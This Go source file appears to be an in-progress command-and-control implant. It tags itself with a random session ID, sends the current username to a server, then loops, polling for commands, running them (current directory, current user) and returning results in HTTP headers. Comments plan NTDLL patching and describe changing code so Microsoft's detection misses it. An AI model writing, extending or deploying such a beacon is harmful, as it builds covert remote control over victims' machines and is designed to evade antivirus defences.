package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/user"
	"strings"
	"time"
	"uuid"
)

func getCurrentDir() (mydir string) {
	mydir, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	return
}

func getCurrentUser() (name string) {
	user, err := user.Current()
	if err != nil {
		fmt.Printf(err.Error())
	}
	name = user.Username
	return
}

func main() {

	// to do
	// generate random uuid of numbers/letters [all done]
	// add a user agent with http.requests [all done]
	// execute out from http request [all done]
	// Patch NTDLL
	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}

	result := getCurrentUser()
	toSend := string(result)
	toSend = strings.Replace(toSend, "\n", "", -1)
	fmt.Printf(toSend)

	//time.Sleep(10)
	req, err := http.NewRequest("GET", "http://localhost:8000/", nil)
	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
	for true {
		// current issue is that we're not retrieving and executing the new ocmmand
		req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err = client.Do(req)
		body, err := ioutil.ReadAll(resp.Body)
		//body = string(body)
		//fmt.Printf(body)
		statusC := resp.Status
		if err != nil {
			log.Fatalln(err)
		}

		//Convert the body to type string
		sb := string(body)
		for sb == "0" {
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
		}
		// After verifying we have a command to execute, we now need to grab the commands signature
		// This is stored in a header value of the request
		sig := resp.Header.Get("Verifier")
		fmt.Printf(sig + "\n")
		// This is trying to fix the issue of getting 500 status codes
		// when the DB is cleared
		//
		//statusC = string(statusC)
		fmt.Printf(statusC)
		fmt.Printf("\n")
		for statusC == "'500'" {
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
			statusC = resp.Status
		}
		fmt.Printf(sb + "\n")

		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this

		// We are turning this into a switch statement
		// We need to append the results of these functions to the result string
		// Then we send it
		switch sb1 {
		case "PWD":
			result = getCurrentDir()
		case "GCU":
			result = getCurrentUser()
		}

		toSend := string(result)
		fmt.Printf(toSend)
		toSend = strings.Replace(toSend, "\n", "", -1)
		fmt.Printf(toSend)

		time.Sleep(2 * time.Second)
		req, err = http.NewRequest("GET", "http://localhost:8000/schema", nil)
		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
		resp, err = client.Do(req)
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()
	}

}
